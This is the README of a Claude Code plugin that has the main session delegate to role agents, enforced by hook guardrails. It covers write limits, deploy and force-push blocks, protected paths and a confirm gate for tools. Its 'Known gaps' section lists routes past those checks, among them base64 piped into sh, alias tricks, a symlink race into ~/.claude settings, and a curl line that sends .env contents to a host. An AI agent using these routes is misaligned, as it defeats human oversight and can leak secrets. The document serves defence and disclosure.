# chief-of-staff

Makes your main Claude Code session a Chief of Staff that delegates to named agents, organised in
departments (this plugin was called `website-team` before 0.6.0). The Chief of Staff plans and assigns the
work; with the `agent-board` plugin each agent shows on the board, greyed out while idle and as a live
card while it works.

Since 0.10.0 the team is data: each agent's department, one-line job, limits and checks are in its own
`agents/<name>.md`, and the departments are in `departments.json`. Adding an agent is writing one file.

**These hooks are best-effort guardrails against mistakes and prompt injection, not containment.** They
match tool names and command text, and a determined command can be spelled another way. Real containment
comes from the environment's network policy and Claude Code's permission mode and rules. Every guardrail
here fails closed: when the plugin cannot tell what a call is, it refuses or asks.

**The guardrails only run when Claude Code loads the plugin's hooks module.** See
[Are the hooks running?](#are-the-hooks-running) below: without it, the agents still exist, but no limit
is enforced.

## Departments

The plan is a 50-agent organisation in twelve departments, added over several releases. All twelve exist
now; the five marked on are on by default. Turn them on and off with `/team`.

| Department (`id`) | Default | Agents today |
|---|---|---|
| Product & Engineering (`product-engineering`) | on | `reverse-engineer`, `frontend-developer`, `backend-developer`, `qa-tester`, `devops-engineer` |
| Security (`security`) | on | `security-reviewer`, `security-engineer` |
| Creative (`creative`) | on | `creative-director`, `web-designer`, `copywriter` |
| Marketing & PR (`marketing-pr`) | on | `marketing-strategist`, `seo-specialist` |
| Social (`social`) | on | none yet |
| Sales (`sales`) | off | none yet |
| Data & Analytics (`data-analytics`) | off | none yet |
| Finance (`finance`) | off | none yet |
| Risk, Audit & Compliance (`risk-audit-compliance`) | off | none yet |
| Legal (`legal`) | off | none yet |
| Operations & People (`operations-people`) | off | none yet |
| Strategy & Research (`strategy-research`) | off | none yet |

| Agent | Does |
|---|---|
| `reverse-engineer` | How another site or app does something, using [REA](https://github.com/morluto/rea); writes `.md` reports only, never copies code or assets |
| `creative-director` | Creative direction first (concept, mood, tone), then reviews design and copy before build; writes only `.md` notes |
| `web-designer` | Layout, visual design, design tokens, responsive behaviour |
| `frontend-developer` | Pages, components, forms, client-side state |
| `backend-developer` | APIs, database, auth, integrations |
| `qa-tester` | End-to-end and automated tests, bug reports |
| `security-reviewer` | Read-only security review with ranked findings and fixes |
| `security-engineer` | Fixes what the reviewer found and hardens the app (auth, inputs, headers, secrets, dependencies, monitoring); never deploys |
| `marketing-strategist` | Audience, positioning, page message order, CTA |
| `copywriter` | Every word on the site |
| `seo-specialist` | Keywords, metadata, sitemap, structured data |
| `devops-engineer` | Hosting, CI, env vars, release checks; never deploys without your OK |

(The agent-board plugin still groups agents by the words in their names, so its columns are not these
departments yet.)

### /team

- `/team` lists every department, whether it is on, and its agents (and any problems in the team files).
- `/team on <id>` and `/team off <id>` switch departments (several ids, separated by spaces or commas);
  `/team on all` and `/team off all` switch every one; `/team reset` goes back to the defaults. An unknown
  id changes nothing. The choice is kept per machine, like `/delegate`, and applies from your next message.

While a department is off, its agents are left out of the Chief of Staff's team list and are not offered
to the model, its routing rules are dropped, and the Chief of Staff is told it is off and how to turn it
on, so it can tell you. A rule that names a role in a department that is off says so ("ask the person to
run `/team on <id>` first"). If the Chief of Staff still tries to assign one of its agents, the call is
refused with "ask the person to run `/team on <id>`", however the type is capitalised. Agents from other
plugins and built-ins (`general-purpose`, `Explore`) are never refused. `/delegate off` does not lift this.

## Adding an agent: one file

Write `agents/<name>.md` with Claude Code's usual agent frontmatter plus the team fields, and the body
(its instructions). No code change; the Chief of Staff reads the files at the start of each message.

```markdown
---
name: social-media-manager
description: Social media manager. Use to plan, write and schedule posts and replies for the brand's accounts.
tools: Read, Write, Edit, Glob, Grep, WebSearch, WebFetch
department: social
does: social posts, replies and the content calendar
write-limit: md-only
checked-by: creative-director
confirm: publish or schedule a post, reply in public
---

You are the team's social media manager. ...
```

| Field | Values | What it does |
|---|---|---|
| `name`, `description`, `tools`, `skills` | as in Claude Code | Unchanged: Claude Code reads them (it logs the team fields below as keys it does not apply, which is expected) |
| `department` | an `id` from `departments.json` | Where the agent is listed and which `/team` switch controls it. Missing or unknown: the agent **cannot be assigned** until the file is fixed, and `/team` lists it |
| `does` | one line | What the Chief of Staff reads about the role. Missing: the description's first sentence (a folded `description: >` block is read too). A file with neither is a problem |
| `order` | a whole number | Where the agent sits in its department's list, lowest first (the shipped roles use 10, 20, ...). Without it, after the numbered ones, by name |
| `write-limit` | `none`, `no-scripts`, `md-only` | `md-only`: only `.md` reports and notes. `no-scripts`: no scripts, build or deploy config (`.js`, `.ts`, `.py`, `.sh`, `wrangler.*`, `package.json`, CI files...); styles, HTML and component markup are fine. It can only **tighten**: the shipped roles keep the limits in the plugin's code (see below) whatever their file says. **A new role must state it**: a role that is not one of the twelve shipped ones and states no `write-limit` writes only `.md` |
| `write-dirs` | project folders, comma-separated | Folders at the top of the project this role may write any file into despite its write limit. Honoured only as far as `FLOOR` in the code allows: today only `reverse-engineer`, for `research` and `captures` |
| `limit-hint` | one line, quoted | Added to the role's denial message ("Describe the technique in your report; ...") |
| `can-deploy` | `true` | Honoured **only** for a role the plugin's code allows to deploy (today only `devops-engineer`), and only as the exact type `chief-of-staff:<name>`. A new role gets deploy rights only by being added to `FLOOR` in `hooks/register.ts`, a code change on purpose |
| `checked-by` | role names, comma-separated | Adds a routing line "`<role>`'s output goes to `<checker>` before it is called done" |
| `confirm` | actions, comma-separated | Adds a line telling the Chief of Staff this role needs your OK before those actions, and is named in the confirm gate's message |

Lists may also be written `[a, b]` or as `- item` lines. There are no inline comments: a `#` inside a
value is part of it. Quote a value that holds `: `.

**A file with any problem cannot be assigned until it is fixed, and its agent writes only `.md`**: an
unknown department, `write-limit` or `can-deploy` value, a key given twice (in any case, `Name:` and
`name:`), or a second file with the same `name`. `/team` and the Chief of Staff's instructions list them.
Only regular files of up to 64 KiB are read (no links, no FIFOs). An agent of this plugin whose file is
missing writes only `.md` and never deploys.

**The floor.** `FLOOR` in `hooks/register.ts` holds the twelve shipped roles' limits: `web-designer`
`no-scripts`, `reverse-engineer` and `creative-director` `md-only`, and only `devops-engineer` may deploy.
A file can make its role stricter than that, never looser.

After adding or changing an agent file, run `node scripts/fixture.mjs` so the tests check the new file
too (see Tests).

Building a new department? Start with [REFERENCES.md](REFERENCES.md): source prompts to adapt, and how.

### departments.json

Each department has `id`, `name`, a one-line `purpose`, `default` (`"on"` or `"off"`) and `rules`: the
routing lines the Chief of Staff gets while it is on. Rules that span departments (security review for
anything with a form, login, payment or user data; one agent, one role; web research; reverse engineer
first; never deploy, delete or spend without your OK) are part of the plugin's own text and always there.
If `departments.json` is missing or broken, the plugin uses its built-in copy of the twelve departments
and their defaults (without the routing rules) and `/team` says so.

## The Chief of Staff always delegates

Your main session is the Chief of Staff. These things make it delegate:

- **A hard rule.** The main session cannot use Edit, Write, MultiEdit or NotebookEdit: those calls are
  refused with a note to hand the work to an agent. Agents can still change files. This is the only rule
  `/delegate off` lifts.
- **Role limits**, from the floor and each agent's frontmatter. `reverse-engineer` and `creative-director`
  are `md-only`; `web-designer` is `no-scripts`. Write limits hold inside the project only (the session's
  folder and below, even when that folder is itself under a temp folder), never in other temp folders (`/tmp`, `$TMPDIR`, Claude's scratchpad), so `curl -o /tmp/app.js`
  works for every role; `reverse-engineer` may also write any file into the project's `research/` and
  `captures/`. The same limits apply to MCP tools whose names write,
  download, export, generate, convert or extract files, through every argument that looks like a path,
  and (best effort) to the files a shell command writes through redirects, `tee`, `cp`, `sed -i` and the
  like. An agent whose type cannot be told gets the tightest limits (`md-only`, no deploy).
- **Deploys and history.** Only `devops-engineer` can run deploy commands (`wrangler deploy`,
  `wrangler --env prod deploy`, `npx wrangler@3 deploy`, `npm exec wrangler deploy`, `yarn wrangler deploy`,
  `bun x wrangler deploy`, `vercel`, `vc --prod`, `netlify deploy`, `firebase deploy`, `npm run deploy*`,
  `pnpm -C site deploy`, `make deploy*`, ...), the Chief of Staff included. Rewriting git history is
  refused for everyone: `git filter-repo`, `git filter-branch`, BFG and pushes that overwrite or delete on
  the remote (`--force`, `-f`, `--mirror`, `--delete`, `-d`, `--prune`, `+branch`, `:branch`, quoted or
  not, an argument built from a variable or substitution or holding braces, `git send-pack --force`,
  `git -c remote.*.push=+...` or `remote.*.mirror=true`); only `devops-engineer` may
  `git push --force-with-lease`. Deleting a remote branch (`git push --delete`, `-d`, `:branch`) is not
  refused: an agent asks you ("Deleting a remote branch needs the person's OK."). A push to a computed branch name (`git push -u origin "$(git branch --show-current)"`, `"$BRANCH"`)
  also asks, since it could expand to a `+branch`; an explicit `-f`, `--force` or `+branch` stays refused. These checks run
  on Bash, Monitor, PowerShell and any other tool with a `command`, and on the command fields (`command`,
  `cmd`, `input`, `script`, `code`) of MCP tools that run processes, shells or code. Leaked keys are
  reported with their location and rotation steps for you to act on. A blocked agent is told who the work
  belongs to.
- **How commands are read.** A small tokenizer walks each command once: quotes and escapes (`"git"`,
  `\git`), `$(...)` and backticks, `bash -c`, `eval`, heredocs fed to a shell, `find -exec`, and wrappers
  (`sudo`, `env`, `timeout`, `nice`, `setsid`, `stdbuf`, `ionice`, `xargs`, `npx`, `bunx`, `pnpm exec`,
  `npm exec`, `bun x`, `node <script>`, `time`, `su -c`, `runuser`, `flock`, `taskset`, `chrt`,
  `script -c`, `parallel`, `trap`), `$'...'` and `$"..."`, here-strings fed to a shell. Nothing in it
  backtracks, and one work budget covers the whole command, nested parses included (2,000 simple
  commands, 64 KB scanned, 6 levels deep). A command over 16 KB or over the budget is not read: an
  agent's asks you (or is refused where nobody can be asked), the Chief of Staff's is refused with "Split
  it into shorter commands." A script an interpreter runs (`node ~/.claude/plugins/.../draw.mjs`,
  `python3 ~/.claude/skills/.../build.py`) is read, not written: it runs for every agent.
- **Protected paths.** No agent may write: this plugin's own folder (its real path too); installed plugins
  and their store (`.claude/plugins/`); Claude Code's settings (`.claude/settings*.json`), agents, skills,
  commands, hooks and output styles in any `.claude` folder; `~/.claude/CLAUDE.md`, `~/.claude.json`, any
  `.mcp.json`, `managed-settings.json`. Paths are made plain first (`.`, `..`, `//`, `~`, `$HOME`) and
  resolved through their nearest existing folder; a path that cannot be resolved (`~` without a known
  home, `~someone`) is refused. A project's own `CLAUDE.md` or `CLAUDE.local.md` is not refused: you are
  asked. For shell commands the check reads where the command writes (redirect targets, `tee`, `cp`,
  `mv`, `install`, `ln`, `rsync`, `dd of=`, `curl -o`, `wget -O`, `tar -x -C`, `unzip -d`, `sed -i`,
  `perl -i`, `touch`, `rm`, `git -C <dir> pull`, ..., after any `cd`): a protected destination, or one
  under a folder named like this plugin (`chief-of-staff/...`, which also covers a `--plugin-dir` checkout),
  is refused. So is a write into a protected folder or any `.claude` folder (`cp x ~/.claude/`,
  `mv x ~/.claude`, `cp -t`, `rsync`, `unzip -d`, `tar -C`, `ln`), where each source's landing path is
  checked too; `<>` counts as a write, and attached values (`-C/x`, `-o/x`) are read. Destinations are
  resolved through their nearest existing folder. After a `cd` that cannot be followed (to a variable or
  glob, `cd -`, `popd`, `CDPATH=`) the folder is unknown. A write it cannot follow (inline code in
  `python -c` or `node -e`, a variable in the destination, a relative write after such a `cd`) is refused
  when the command mentions `.claude` with plugins, settings, agents, skills,
  commands, hooks or CLAUDE.md, or `.claude.json`, `.mcp.json`, managed settings or the plugin's folder.
  Plain reads pass (`grep x chief-of-staff/hooks/gate.ts > /tmp/out`): only the destination counts.
- **Departments.** Agents of a department that is off cannot be assigned (see `/team`).
- **The confirm gate**, an allow-list. When an agent (not the Chief of Staff) calls a connected (MCP)
  tool, you are asked first, with "Draft it and report back; the Chief of Staff does this only after the
  person confirms.", unless the tool is clearly read-only. Only an approval dialog for a person counts:
  where nobody can be asked, or a host would answer, the call is refused with that message.
  - Read-only means every word of the tool's name is a read verb (`get`, `list`, `search`, `read`,
    `find`, `fetch`, `show`, `view`, `retrieve`, ...) or a known noun, and the first word is not an action
    (`get_post` passes, `post_status` asks). `resolve`, `check`, `suggest`, `scan`, `query`, `download`
    and `extract` are not read verbs. Past and noun forms (`deleted`, `published`, `sender`, `payload`,
    `merged`, `pushed`) are not actions. The server's own name in front is dropped (`slack_read_channel`)
    unless it is itself an action word. The engine's own read-only word counts only when the name holds
    no action word (create, update, set, share, write, make, delete, send, post, ...). Anything unknown asks.
  - REA (`mcp__plugin_rea_rea__*`, `mcp__rea__*`): its analysis and read tools pass (`binary_overview`,
    `list_procedures`, `procedure_pseudo_code`, `search_strings`, `get_call_graph`, `inspect_*`,
    `read_bytes`, `xrefs`, `analyze_*`, `trace_application_feature`, `compare_application_versions`,
    `capture_web_screenshot`, `open_binary`, ...). These ask: `set_*`, `update_*`, `annotate_*`, comments
    and bookmarks, `push_adb_file`, `install_`/`uninstall_adb_package`, `start_`/`stop_adb_*`,
    `execute_rizin_command`, Frida sessions and scripts (`instrument_with_frida`, `load_frida_script`, ...),
    `gdb_console`, `rizin_debug_command`, `cutter_command`, `import_*` and recording unknowns.
  - Named read tools pass on their own servers: Scrapling's fetch and session tools (`make_request`,
    `open_request_session`, `session_make_request`, `browser_open`, `browser_close`, `browser_fetch`,
    `stealthy_fetch`, `bulk_*`, `close_session`, `list_sessions`); Gmail's `label_*`, `unlabel_*`,
    `untrash_*`, `unmark_*_spam` and `download_gmail_attachment`; Taplio's `pick_media`; Higgsfield's
    balance, transactions, `show_*`, `get_*`, `list_*`, GPU and job status, quotes and presets; Canva's
    `export-design`, formats, job and status tools, `help`, `resolve-shortlink`, `request-outline-review`;
    21st's `get_*`, `list_*`, `search_*` and video read tools; and a few more (99tests reports, Booking.com
    Q&A, ChangeThisFile's `list_conversions`, Claude Docs' `guide`, Composio's schema and search tools,
    Slack's `search_*`, desktop-commander's search and read tools, `get_file_contents`, `list_commits`,
    `search_code`, `browser_snapshot`, `browser_take_screenshot`, `retrieve_*`, `get-library-docs`,
    `get_deployment_build_logs`). The bot-protection rule still applies to their arguments.
  - Drafts pass: `create_draft`, `update_draft`, `create_comment_draft`, and `send_message_draft` on the
    Slack server only. Any other action next to "draft" (`send_draft`, `publish_draft`,
    `commit_comment_draft`) asks.
  - Names that hide a send, post, pay, publish, deploy, delete, transfer, refund, charge, merge or push
    (`sendmessage`, `SMSSend`) ask, and so do tools that run other tools or code (Composio
    `MULTI_EXECUTE` and `PROXY_EXECUTE`, `apps_invoke`, `execute_*`, process, shell and browser exec tools).
  - Generation credits (`/delegate credits free`, the default) cover only `generate_<media>` and
    `<media>_generate`, where media is image, images, video, audio, voice, speech, music, sound,
    sound_effect, design, 3d, avatar or thumbnail, with no other action word in the name; and these media
    tools by name: `upscale_<media>`, `outpaint_image`, `reframe`, `remove_background`, `voice_change`,
    `separate_stems`, `separate_image_layers`, `motion_control`, `scene_builder_3d_generate_*`,
    `build_ai_influencer`, `create_voice`, `create_voice_from_confirmed_audio`, and Canva's `create-design`,
    `create-video`, `create-design-from-*`, `resize-design`, `generate-design*`, `generate-image`.
    `/delegate credits ask` makes each one ask. `generate_invoice`, `generate_api_key`,
    `generate_and_email_report`, `ai_influencer_generate`, renting GPUs, buying credits, publishing,
    sharing, deploying, sending, ads writes, contests, connecting accounts and secrets or databases ask.
  - Shell commands (Bash, Monitor, PowerShell) ask the same way when they run `claude` (also
    `npx @anthropic-ai/claude-code` or a `claude-code/cli.js`), change GitHub (`gh pr merge|create|review|comment`,
    `gh release create|delete|edit`, `gh repo create|delete|edit`, `gh workflow run`, `gh issue create|comment`,
    `gh gist create`, `gh secret set`, `gh api` with a write method, `-f`/`-F` fields, `--input` or a method
    override header), publish a package (`npm publish`), move a branch ref (`git update-ref refs/heads/...`,
    `git branch -f|-D main`), send data to another host with `curl`, `wget`, `http` or `xh` (a non-GET
    method, `-d`, `--data*`, `-F`, `--upload-file`, `--json`; localhost is fine; `wget -T` and `-nd` are not
    uploads; local means `localhost`, `*.localhost`, `127.*`, `[::1]`, `0.0.0.0` and
    `host.docker.internal`), delete a remote branch, run a program named by a variable or substitution
    (`$(which claude)`, `$c`), use `env -S`, hide `CLAUDECODE` (`env -u`, `unset`), or write a project's
    `CLAUDE.md`.
  - The Chief of Staff itself is not gated: it asks you in the conversation.
- **Instructions.** A "Chief of Staff" section in the main session's instructions, generated each message:
  the team grouped by department (only departments that are on and have assignable agents), the
  departments that are off, agent files with problems, department rules, the `checked-by` and `confirm`
  lines, and how to run the work: split it, brief each agent fully, run independent tasks in parallel,
  check reports, sum up. Agents never get this section. With `/delegate off` the section stays, without
  the no-edit wording.

It still answers plain questions itself. The status line shows `Chief of Staff: delegating` while the
rule is on. Turn it off and on per machine with `/delegate off` and `/delegate on`; `/delegate` shows the
settings, and `/delegate credits ask` or `/delegate credits free` sets generation credits. `/delegate`
and `/team` loosen a setting (`/delegate off`, `/delegate credits free`, `/team on ...`, a `/team reset`
that turns a department on) only when you type it at the prompt or send it through Remote Control: not
from `claude -p`, a plugin, a schedule or another session. Tightening works from anywhere. A Claude Code
session started from inside another one (Claude Code sets `CLAUDECODE` or `CLAUDE_CODE_CHILD_SESSION` for
what it runs) is held to agent limits throughout: its main session keeps the no-edit rule even with `/delegate off`,
its agents write only `.md` and never deploy unless they are one of the twelve shipped roles (which keep
their own limits, never looser), and nothing can be loosened.

**When a guardrail refuses something legitimate**, every agent and the Chief of Staff are told to stop and
report the exact refusal, and never to work around it (for example by writing the command to a script
file and running it). Tell the person the refusal; they decide.

### Known gaps

**These hooks are guardrails against mistakes and prompt injection, not containment.** They catch the
easy routes; they do not stop a determined agent. Real containment is Claude Code's permission rules and
mode plus the environment's network policy. Known ways past them, by design or not yet handled:

- **Hooks not loaded.** Nothing here runs if Claude Code does not load the hooks module (see the next section).
- **The script-file route, for every shell rule and the bypass rule.** A script file that an agent writes
  and then runs (`bash x.sh`, `python3 x.py`, `node x.mjs`) is read, not checked: whatever it does inside
  (a force push, a deploy, a protected write, a bot-protection bypass, sending data out) is not seen. The
  agents are told never to do this when a guardrail refuses them; that instruction is the only guard.
- **A nested Claude Code launched in a way the gate cannot see**: from a script file, through an alias,
  an encoded command, or a program whose name the tokenizer does not resolve. One started from Claude
  Code's shell is held to agent limits by `CLAUDECODE`; one whose environment has been cleaned is not.
- **Programs named indirectly**: shell aliases (`alias p='git push -f'`), functions, `gh alias`, git
  aliases (`git -c alias.p="push --force" p`, aliases in git config), brace expansion of the command word
  (`{git,push,-f}`), `BASH_ENV`. (A variable or substitution as the command name asks; so does a push to a
  computed branch name such as `"$BRANCH"`.)
- **Encoded or indirect commands**: base64 into `sh`, text piped into a shell (`echo cmd | sh`,
  `bash -s`), process substitution (`bash <(...)`, `source <(...)`), `xargs` fed the command, `awk`'s
  `system()`, `make -f` from a here-string, `ssh host 'cmd'`, `python -c "os.system(...)"`,
  `node -e "child_process..."`, MCP code runners (`run_code`) whose code is not a shell command.
- **Deploy tools other than** wrangler, vercel, netlify, firebase and npm/pnpm/yarn/bun/make scripts
  named `deploy*`: `terraform apply`, `kubectl apply`, `fly deploy`, `railway up`, `gcloud app deploy`,
  `aws s3 sync`, `docker push`, `heroku`, `surge`, GitHub Actions run by other means.
- **Data sent out other ways**: a GET with data in the URL or headers (`curl "https://x/?k=$(cat .env)"`,
  `curl -G -d`), `curl -K config`, `scp`, `nc`, `git push` to a new remote, a script's own HTTP client.
- **Write limits through the shell are best effort**: `web-designer` keeps Bash (its taste-skill scripts
  need it), so its `no-scripts` limit holds for Edit, Write and MCP file tools, and for the shell only
  where the tokenizer sees the destination (redirects, `tee`, `cp`, `sed -i`, ...), not for a script or
  interpreter that writes files itself. The same holds for `md-only` roles that have Bash.
- **Protected writes the checks cannot see**:
  - symlink races and time-of-check/time-of-use: `ln -s ~/.claude /tmp/cc; echo x > /tmp/cc/settings.json`
    in one command (the link does not exist yet when the command is checked), or a link swapped after
    the check;
  - a glob destination or `cd` target that does not spell `.claude` (`cd ~/.clau*`), a destination built
    from a variable or substitution in a command that does not otherwise name the protected place
    (`D=$(echo ...|base64 -d); cp x $D/store`), a `cd` that fails at run time;
  - a relative path written from inside the plugin's own folder when the session's folder is not known;
  - `xxd -r`, `patch`, `git apply` and other tools that write files the tokenizer does not list;
  - inline code that builds the path (`open('/root/.cl'+'aude/settings.json','w')`);
  - an archive extracted into a folder that is not itself protected but holds one (`unzip x -d ~` that
    creates `~/.claude/...`).
- **Places that run code but are not protected**: scripts that `settings.json` runs (status line, hooks
  scripts outside `.claude/hooks/`), `.git/hooks/` and `.git/config` (`core.hooksPath`, `core.sshCommand`),
  shell rc files (`~/.bashrc`, `~/.profile`, `~/.zshrc`), `~/.claude/keybindings.json` and other files in
  `~/.claude` that are not settings, agents, skills, commands, hooks, plugins, `CLAUDE.md` or output styles.
- **MCP**: tool names are a guess, so a server may name an acting tool like a read (`list_to_inbox`); the
  allow-list errs towards asking, but a misleading name can pass. Paths are read from keys that name paths
  and from strings that look like paths; a path hidden elsewhere in an argument is not seen. MCP tools
  that read are not path-checked.
- **The confirm gate trusts Claude Code's approver**: it asks only when the engine says a person will
  answer, and refuses otherwise.

You can also ask for roles directly: "Have the web designer and the frontend developer build the homepage,
then the security reviewer check it." For hardening, the security reviewer audits, the security engineer
fixes, and the security reviewer re-tests. Edit any file in `agents/` to change a role.

## Are the hooks running?

Every rule above lives in the plugin's hooks module (`hooks/register.ts`). Claude Code (checked on 2.1.327)
loads the hooks module of a plugin you installed yourself only when all of these hold:

- Its rollout switch for installed plugins' hooks modules (`tengu_plugin_hooks_modules`, a server-side
  feature flag) is on for your account. While the session's first flag fetch has not answered, the
  module waits and loads at a turn start once it reads on: the line "hooks modules are turned off for
  installed plugins in this process: this wake's flag fetch has not answered the rollout switch" is that
  wait, and is normally followed by the module loading. If the switch is served off, the module never
  loads in that process.
- Managed settings do not set `disableAllHooks` or `allowManagedHooksOnly`, and the session is not
  started with `--bare` or `--safe-mode`.

There is no setting of your own that forces the switch on. A plugin your organization manages, or one
built into Claude Code, loads regardless.

To check: `/delegate` and `/team` exist and answer, and the status line shows
`Chief of Staff: delegating`. Or run `claude --debug` and look in the debug log for
`hooks module chief-of-staff@... loaded` or `... not loaded: <why>`. If the hooks are not loaded, the
agents and their `tools:` lists still work, but nothing here is enforced: the Chief of Staff can edit
files, any agent can deploy, and nothing asks before a send. In that case keep Claude Code's own
permission rules (for example `deny` rules for `Bash(wrangler deploy:*)` and `Bash(git push --force:*)`)
and a permission mode that asks.

## Install

Inside a Claude Code session:

```
/plugin marketplace add saifelshafei-sys/skills
/plugin install chief-of-staff@saifelshafei-skills
```

From a shell:

```bash
claude plugin marketplace add saifelshafei-sys/skills
claude plugin install chief-of-staff@saifelshafei-skills
```

For the live agent board too:

```bash
claude plugin install agent-board@saifelshafei-skills
```

## Superpowers

If [Superpowers](https://github.com/obra/superpowers) is installed, the Chief of Staff uses its planning
skills (brainstorming, writing-plans) to split big jobs, and never its execution skills to do the
work itself: each step still goes to a role.

## REA for the reverse engineer

`reverse-engineer` uses REA's `reverse-engineer-anything` skill and MCP tools. Install REA once per
machine (see [morluto/rea](https://github.com/morluto/rea)):

```bash
claude plugin marketplace add morluto/rea
claude plugin install rea@rea
```

Without REA the agent still works from the public page alone and says so.

## taste-skill for the web designer

`web-designer` preloads taste-skill's `design-taste-frontend` skill when that plugin is installed; `creative-director` and `copywriter` don't, because they have no Bash and the skill needs it to run its scripts.

## Scrapling for web research

`seo-specialist`, `marketing-strategist` and `reverse-engineer` can use
[Scrapling](https://github.com/D4Vinci/Scrapling)'s MCP tools to capture pages and crawl sites. Its
CAPTCHA and Cloudflare solving is refused by a hook for every agent, whatever `/delegate` says.
Under the confirm gate, Scrapling's fetch and session tools (`make_request`, `session_make_request`,
`open_request_session`, `browser_open`, `browser_close`, `browser_fetch`, `browser_fetch_once`,
`browser_extract`, `browser_screenshot`, `stealthy_fetch`, `bulk_*`, `close_session`, `list_sessions`) run
without asking; the bot-protection rule still applies to every argument.
Install once per machine (needs Python):

```bash
py -m pip install "scrapling[ai]"
scrapling install
claude mcp add --scope user scrapling -- scrapling-mcp
```

## Tests

From the repository root:

```bash
node chief-of-staff/scripts/fixture.mjs --check   # tests/files.ts matches agents/*.md and departments.json
claude plugin test chief-of-staff                 # the hook tests
claude plugin validate chief-of-staff             # manifest, hooks and type check
```

The plugin reads its agent files at run time. The tests run with no file system, so they read a copy,
`tests/files.ts`; `node chief-of-staff/scripts/fixture.mjs` rewrites it after you change a team file.
`tests/gate-names.ts` holds the confirm gate's tables: every tool name QA and the security review tried.
